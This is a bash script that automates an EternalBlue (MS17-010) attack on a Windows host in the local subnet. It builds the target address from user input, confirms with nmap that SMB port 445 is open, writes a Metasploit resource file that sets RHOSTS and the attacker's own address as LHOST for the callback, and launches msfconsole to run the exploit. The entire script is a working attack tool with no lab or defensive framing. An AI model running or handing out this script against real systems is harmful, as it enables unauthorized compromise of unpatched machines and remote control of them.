#!/bin/bash

# Function to get the local IP address
get_local_ip() {
    local_ip=$(hostname -I | awk '{print $1}')
    echo "$local_ip"
}

# Function to create the Metasploit resource script
create_rc_file() {
    local target_ip=$1
    local my_ip=$2
    cat <<EOL > metasploit_commands.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target_ip
set LHOST $my_ip
exploit
EOL
}

# Function to perform a quick Nmap scan to check if port 445 is open
check_port() {
    local target_ip=$1
    echo "Scanning $target_ip for port 445..."
    nmap -p 445 $target_ip | tee /dev/tty | grep -q "open"
    if [ $? -eq 0 ]; then
        echo "Port 445 is open on $target_ip. Proceeding with Metasploit."
    else
        echo "Port 445 is not open on $target_ip. Exiting."
        exit 1
    fi
}

# Main function
main() {
    local my_ip
    my_ip=$(get_local_ip)
    echo "Detected local IP address: $my_ip"
    
    # Get the last octet of the target IP from user input
    read -p "Enter the last octet of the target IP address: " target_last_octet
    
    # Construct the target IP address
    target_ip="${my_ip%.*}.$target_last_octet"
    echo "Full target IP address: $target_ip"
    
    # Perform a quick Nmap scan to check if port 445 is open
    check_port "$target_ip"
    
    # Create the .rc file
    create_rc_file "$target_ip" "$my_ip"
    
    # Run Metasploit console with the .rc file directly
    echo "Running Metasploit with metasploit_commands.rc..."
    msfconsole -r metasploit_commands.rc
    
    # Optionally remove the .rc file
    rm metasploit_commands.rc
}

# Run the main function
main
